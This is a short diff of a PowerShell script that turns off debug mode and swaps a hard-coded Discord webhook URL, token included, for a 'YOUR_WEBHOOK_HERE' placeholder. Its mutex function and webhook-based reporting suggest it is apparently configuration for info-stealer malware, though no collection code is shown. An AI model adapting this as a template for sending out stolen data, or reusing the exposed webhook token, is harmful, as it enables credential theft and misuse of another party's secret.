@@ -1,4 +1,4 @@
-$debug = $true
+$debug = $false
 
 if ($debug) {
     $ProgressPreference = 'Continue'
@@ -27,7 +27,7 @@ function KDMUTEX {
 
 Add-Type -AssemblyName PresentationCore, PresentationFramework
 
-$webhook = "https://discord.com/api/webhooks/1236436488229490838/Goqy1od7Rs2P1WrYwT39nNN0Qs_nZyhGx8G5uGSW4jc4KxNAQGYStFHM-4O1Y8ONjLW0"
+$webhook = "YOUR_WEBHOOK_HERE"
 $avatar = "https://i.imgur.com/DOIYOtp.gif"
 
 
